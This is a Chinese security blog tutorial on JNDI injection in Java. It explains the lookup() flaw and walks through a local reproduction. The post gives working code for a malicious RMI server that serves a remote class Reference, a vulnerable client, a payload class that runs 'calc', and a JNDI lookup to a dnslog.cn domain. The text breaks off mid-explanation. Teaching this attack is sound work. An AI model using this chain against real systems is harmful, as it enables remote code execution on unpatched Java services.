#  Java反序列化漏洞之JNDI注入原理及利用IDEA漏洞复现   
原创 神农Sec  神农Sec   2024-11-29 01:38  
  
#    
  
  
扫码领资料  
  
获网安教程  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
网络安全领域各种资源，学习文档，以及工具分享、前沿信息分享、POC、EXP分享。  
不定期分享各种好玩的项目及好用的工具，欢迎关注。  
#   
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x1 前言**  
  
  
本篇文章我也是看过很多的博客写的，中间也遇到很多问题，JNDI注入漏洞的危害还是蛮高的。下面我们从RMI以及DNS协议进行详细的漏洞分析，其中漏洞的危害原因主要是lookup()函数可控，可以执行恶意的命令，从而造成恶意攻击。  
  
   
  
   
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x2 JNDI简介**  
  
  
JNDI(Java Naming and Directory Interface)是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。  
  
   
  
   
  
上面较官方说法，通俗的说就是若程序定义了 JDNI 中的接口，则就可以通过该接口 API 访问系统的   
命令服务  
和  
目录服务  
,如下图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NWDynHYJcr4iafM5CynAE4KTp7Mykt7vQQdYkTckGZtuZ5zYUA7sTL0g/640?wx_fmt=png "")  
  
   
  
   
<table><tbody><tr><td data-colwidth="130" width="130" valign="top" style="width:97.5pt;background:#F5F5F5;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">协议</span></span></p></td><td data-colwidth="619" width="619" valign="top" style="width:464.25pt;background:#F5F5F5;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">作用</span></span></p></td></tr><tr><td data-colwidth="130" width="130" valign="top" style="width:97.5pt;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;mso-fareast-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">RMI</span></span></p></td><td data-colwidth="619" width="619" valign="top" style="width:464.25pt;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;mso-fareast-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">JAVA 远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象</span></span><o:page></o:page></p></td></tr><tr><td data-colwidth="130" width="130" valign="top" style="width:97.5pt;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;mso-fareast-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">DNS</span></span></p></td><td data-colwidth="619" width="619" valign="top" style="width:464.25pt;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">域名服务</span></span></p></td></tr><tr><td data-colwidth="130" width="130" valign="top" style="width:97.5pt;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;mso-fareast-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">CORBA</span></span></p></td><td data-colwidth="619" width="619" valign="top" style="width:464.25pt;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">公共对象请求代理体系结构</span></span></p></td></tr></tbody></table>  
   
  
   
  
   
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x3 JNDI注入**  
  
  
   
  
JNDI 注入，即当开发者在定义   
JNDI  
 接口初始化时，  
lookup()  
 方法的参数可控，攻击者就可以将恶意的   
url  
 传入参数远程加载恶意载荷，造成注入攻击。  
  
   
  
   
  
代码示例：  
  
代码中定义了   
uri  
 变量，  
uri  
 变量可控，并定义了一个   
rmi  
 协议服务，   
rmi://127.0.0.1:1099/Exploit  
 为攻击者控制的链接，最后使用   
lookup()  
 函数进行远程获取   
Exploit  
 类（Exploit 类名为攻击者定义，不唯一），并执行它。  
  
package  
  
com  
.  
rmi  
.  
demo  
;  
  
  
import  
  
javax  
.  
naming  
.  
InitialContext  
;  
  
import  
  
javax  
.  
naming  
.  
NamingException  
;  
  
  
public  
  
class  
  
jndi  
 {            
  
      
public  
  
static  
  
void  
  
main  
(  
String  
[]   
args  
)  
  
throws  
  
NamingException  
 {            
  
          
String  
  
uri  
  
=  
  
"rmi://127.0.0.1:1099/Exploit"  
;  
      
//  
 指定查找的   
uri  
 变量            
  
          
InitialContext  
  
initialContext  
  
=  
  
new  
  
InitialContext  
();  
//  
 得到初始目录环境的一个引用            
  
          
initialContext  
.  
lookup  
(  
uri  
);  
  
//  
 获取指定的远程对象            
  
  
      
}            
  
}  
  
   
  
   
  
具体攻击流程图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NHc7S9bYeSYF8oVsoKZsVOEsu5JRoia6G0mRqtVribFIj3VrSEwIKgRfA/640?wx_fmt=png "")  
  
   
  
   
  
   
  
JNDI 注入对 JAVA 版本有相应的限制，具体可利用版本如下：  
<table><tbody><tr><td data-colwidth="100" width="100" valign="top" style="width:75.0pt;background:#F5F5F5;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">协议</span></span></p></td><td data-colwidth="100" width="100" valign="top" style="width:75.0pt;background:#F5F5F5;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;mso-fareast-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">JDK6</span></span></p></td><td data-colwidth="100" width="100" valign="top" style="width:75.0pt;background:#F5F5F5;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;mso-fareast-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">JDK7</span></span></p></td><td data-colwidth="100" width="100" valign="top" style="width:75.0pt;background:#F5F5F5;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;mso-fareast-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">JDK8</span></span></p></td><td data-colwidth="100" width="100" valign="top" style="width:75.0pt;background:#F5F5F5;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;mso-fareast-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">JDK11</span></span></p></td></tr><tr><td data-colwidth="100" width="100" valign="top" style="width:75.0pt;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;mso-fareast-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">LADP</span></span></p></td><td data-colwidth="100" width="100" valign="top" style="width:75.0pt;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;mso-fareast-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">6u211以下</span></span></p></td><td data-colwidth="100" width="100" valign="top" style="width:75.0pt;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;mso-fareast-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">7u201以下</span></span></p></td><td data-colwidth="100" width="100" valign="top" style="width:75.0pt;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;mso-fareast-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">8u191以下</span></span></p></td><td data-colwidth="100" width="100" valign="top" style="width:75.0pt;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;mso-fareast-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">11.0.1以下</span></span></p></td></tr><tr><td data-colwidth="100" width="100" valign="top" style="width:75.0pt;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;mso-fareast-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">RMI</span></span></p></td><td data-colwidth="100" width="100" valign="top" style="width:75.0pt;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;mso-fareast-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">6u132以下</span></span></p></td><td data-colwidth="100" width="100" valign="top" style="width:75.0pt;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;mso-fareast-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">7u122以下</span></span></p></td><td data-colwidth="100" width="100" valign="top" style="width:75.0pt;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;mso-fareast-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">8u113以下</span></span></p></td><td data-colwidth="100" width="100" valign="top" style="width:75.0pt;border-top:solid windowtext 1.0pt;mso-border-top-alt:solid windowtext 0.5pt;border-left:solid windowtext 1.0pt;mso-border-left-alt:solid windowtext 0.5pt;border-bottom:solid windowtext 1.0pt;mso-border-bottom-alt:solid windowtext 0.5pt;border-right:solid windowtext 1.0pt;mso-border-right-alt:solid windowtext 0.5pt;padding:0pt 5.4pt 0pt 5.4pt;"><p><span style="font-family:Microsoft YaHei UI;mso-ascii-font-family:Microsoft YaHei UI;font-variant:normal;text-transform:none;"><span leaf="">无</span></span></p></td></tr></tbody></table>  
   
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x4 JNDI注入漏洞复习**  
##   
### JNDI+RMI  
#### 1、基础环境  
  
我们这里使用IDEA进行JNDI注入漏洞的复现，我们需要先下载JDK的环境，JDK7，8都可以，选择下载自己电脑的版本，因为我的电脑一直都是JDK8的 环境，所以就不下载演示了。  
  
https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html#license-lightbox书签：  
https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html#license-lightbox  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NzMlzqJbjzCfhKH5hWEiaMogLkYA2Qp8wM2ibaYsXiaEHrK6R7iaE6z22qQ/640?wx_fmt=png "")  
  
判断自己的JDK环境版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NjGBKx61fibtHlFbDXgHiaz10Nzyyd6yVLQ3cubeGALMmqqadcJQZWjwg/640?wx_fmt=png "")  
  
   
  
   
  
1、首先 IDEA 新建一个项目  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NoZf1Pgk3cMVXr3V0QDtyqzuYtYMcqEzicF4S6934To2gkRqRytM9rOA/640?wx_fmt=png "")  
  
   
  
   
  
maven一下，然后我这里的项目名称是：jndi_injection_demon，其中这里要注意的就是JDK的环境，选择我们开始下载的JDK环境即可。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NqKP1Ax3XgibOPfW8uiaaaJFomUIJjarBmbq0uibXhaPEXvvrciaNNpZ0wQ/640?wx_fmt=png "")  
  
   
  
   
  
2、在  
 /src/java  
 目录下创建一个包，我这里创建的包的名字是：jndi_rmi_injection  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NsOAibHibvppBIvOgNgjDWz4YOJNLsweCiciatkkcFuyZS9LWqvYw0qSsng/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NqNnjjCTJYgWqDV9wRkXwGXcM6lt8CPLFdrc2dLa03Bnczf3DXQ2nsA/640?wx_fmt=png "")  
  
   
  
   
  
3、在创建的jndi_rmi_injection包里面，创建RMI 的服务端和客户端。  
  
服务端（RMIServer.java）  
  
package  
  
jndi_rmi_injection  
;  
  
  
import  
  
java  
.  
rmi  
.  
registry  
.  
LocateRegistry  
;  
  
import  
  
java  
.  
rmi  
.  
registry  
.  
Registry  
;  
  
import  
  
javax  
.  
naming  
.  
Reference  
;  
  
import  
  
com  
.  
sun  
.  
jndi  
.  
rmi  
.  
registry  
.  
ReferenceWrapper  
;  
  
  
public  
  
class  
  
RMIServer  
 {            
  
      
public  
  
static  
  
void  
  
main  
(  
String  
[]   
args  
)  
  
throws  
  
Exception  
{            
  
          
Registry  
  
registry  
  
=  
  
LocateRegistry  
.  
createRegistry  
(  
7778  
);  
  
          
Reference  
  
reference  
  
=  
  
new  
  
Reference  
(  
"Calculator","Calculator","http://127.0.0.1:8081/"  
);  
  
          
ReferenceWrapper  
  
wrapper  
  
=  
  
new  
  
ReferenceWrapper  
(  
reference  
);  
  
          
registry  
.  
bind  
(  
"RCE",wrapper  
);  
  
      
}            
  
  
}  
  
Ada  
  
   
  
   
  
   
  
客户端（RMIClient.java） 客户端也是受害者  
  
package  
  
jndi_rmi_injection  
;  
  
  
import  
  
javax  
.  
naming  
.  
InitialContext  
;  
  
import  
  
javax  
.  
naming  
.  
NamingException  
;  
  
public  
  
class  
  
RMIClient  
 {            
  
      
public  
  
static  
  
void  
  
main  
(  
String  
[]   
args  
)  
  
throws  
  
NamingException  
{            
  
          
String  
  
uri  
  
=  
  
"rmi://127.0.0.1:7778/RCE"  
;  
  
          
InitialContext  
  
initialContext  
  
=  
  
new  
  
InitialContext  
();  
  
          
initialContext  
.  
lookup  
(  
uri  
);  
  
      
}            
  
}  
  
Ada  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NdwUjWL7QV7ZmNOTjIOeEjmqDM7jKF8X1J9WuFdC2PU6ibZGnBtwlsZQ/640?wx_fmt=png "")  
  
   
  
   
  
HTTP 端恶意载荷（Calculator.java）代码  
  
我们为了形象地演示出恶意命令被执行的样子，我们这里用弹出计算器来演示。其中windows的把cmd命令改成  
calc  
，如果是linux的话，改成  
gnome-calculator  
就可以了  
  
public  
  
class  
  
Calculator  
 {            
  
      
public  
  
Calculator  
()  
  
throws  
  
Exception  
 {            
  
          
Runtime  
.  
getRuntime  
().  
exec  
(  
"calc"  
);  
  
      
}            
  
}  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NoVGicETbtJtVfZ2S9ETBAMym6xMoPYzq9Im2uFLRYVdNX6iarMnORteQ/640?wx_fmt=png "")  
  
   
  
   
#### 2、启动服务  
  
1、将 HTTP 端恶意载荷 Calculator.java，编译成 Calculator.class 文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NmqOdvdww2t6DMUb0MEZd1eichJ3icQ6BBI4Uczzgq6siaM6NlkRBTogYw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NM9HTsJr0CAdmvgYPv7VKBdwu96FJbYDnjNIibhVl0S4NBQGqJjoczLA/640?wx_fmt=png "")  
  
   
  
   
  
2、在 Calculator.class 目录下利用 Python 起一个临时的 WEB 服务放置恶意载荷,这里的端口必须要与 RMIServer.java 的 Reference 里面的链接端口一致  
  
python  
  
-  
m  
  
http  
.  
server  
  
8081  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5N2AgdKia3Xsk1txZ5xbzZ01F0A74b6hflyNMnGJQkI1CDnoulVo7tuibQ/640?wx_fmt=png "")  
  
   
  
  
   
  
3、IDEA 将漏洞环境启动起来并实现攻击，顺序为先运行服务端，再起客户端  
  
服务端启动：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NyJuXAvKUiboWynOBlolPKiaGGIBKVzhgL4ibNfhahpbGJT4VfW2KY7UWw/640?wx_fmt=png "")  
  
  
  
客户端启动：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5Nh4juBaUoxKKvEIHrqohtBsBoUHHRaUt2pRBwa73bUziaqn60ibRVaXGw/640?wx_fmt=png "")  
  
发现当我们把客户端也给启动后，计算器就跳出来了，说明cmd恶意命令已经执行成功了！  
  
   
  
   
#### 3、代码详解  
  
InitialContext类  
  
RMIClient.java代码分析  
  
package  
  
jndi_rmi_injection  
;  
  
  
import  
  
javax  
.  
naming  
.  
InitialContext  
;  
  
import  
  
javax  
.  
naming  
.  
NamingException  
;  
  
public  
  
class  
  
RMIClient  
 {            
  
      
public  
  
static  
  
void  
  
main  
(  
String  
[]   
args  
)  
  
throws  
  
NamingException  
{            
  
          
String  
  
uri  
  
=  
  
"dns://y9p1pr.dnslog.cn"  
;  
  
          
InitialContext  
  
initialContext  
  
=  
  
new  
  
InitialContext  
();  
  
          
initialContext  
.  
lookup  
(  
uri  
);  
  
      
}            
  
}  
  
   
  
InitialContext  
 类用于读取 JNDI 的一些配置信息，内含对象和其在 JNDI 中的注册名称的映射信息  
  
   
  
   
  
我们这里直接找InitialContext 类的相关包，按住 ctrl + B 快捷键，就会看到下面的这个包，发现InitialContext 类继承了一个接口，我们再ctrl + B 快捷键，查看下Context接口  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5NO5RIjYPRUE0aTQ1pql3etB08AlCfh6ewics8ib78VaUp6ibo3MhomNicvQ/640?wx_fmt=png "")  
  
  
  
我们可以看到lookup(String name) 获取 name 的数据，也就是客户端代码中的uri，这里的 uri 被定义为   
rmi://127.0.0.1:7778/RCE  
 所以会通过   
rmi  
 协议访问   
127.0.0.1:7778/RCE  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWvMqo6Rr0K41uUU2lMicE5N2Y6SkYvA73j8Jaia1azsPUMeM5IP2PkjRxyiamspibfsrePafSib2lezzQ/640?wx_fmt=png "")  
  
   
  
  
   
  
Reference 类  
  
RMIServer.java代码分析  
  
package  
  
jndi_rmi_injection  
;  
  
  
import  
  
java  
.  
rmi  
.  
registry  
.  
LocateRegistry  
;  
  
import  
  
java  
.  
rmi  
.  
registry  
.  
Registry  
;  
  
import  
  
javax  
.  
naming  
.  
Reference  
;  
  
import  
  
com  
.  
sun  
.  
jndi  
.  
rmi  
.  
registry  
.  
ReferenceWrapper  
;  
  
  
public  
  
class  
  
RMIServer  
 {            
  
      
public  
  
static  
  
void  
  
main  
(  
String  
[]   
args  
)  
  
throws  
  
Exception  
{            
  
          
Registry  
  
registry  
  
=  
  
LocateRegistry  
.  
createRegistry  
(  
7778  
);  
  
          
Reference  
  
reference  
  
=  
  
new  
  
Reference  
(  
"Calculator","Calculator","http://127.0.0.1:8081/"  
);  
  
          
ReferenceWrapper  
  
wrapper  
  
=  
  
new  
  
ReferenceWrapper  
(  
reference  
);  
  
          
registry  
.  
bind  
(  
"RCE",wrapper  
);  
  
      
}            
  
  
}  
  
   
  
  
reference 指定了一个 Calculator 类，于远程的   
http://127.0.0.1:8081/  
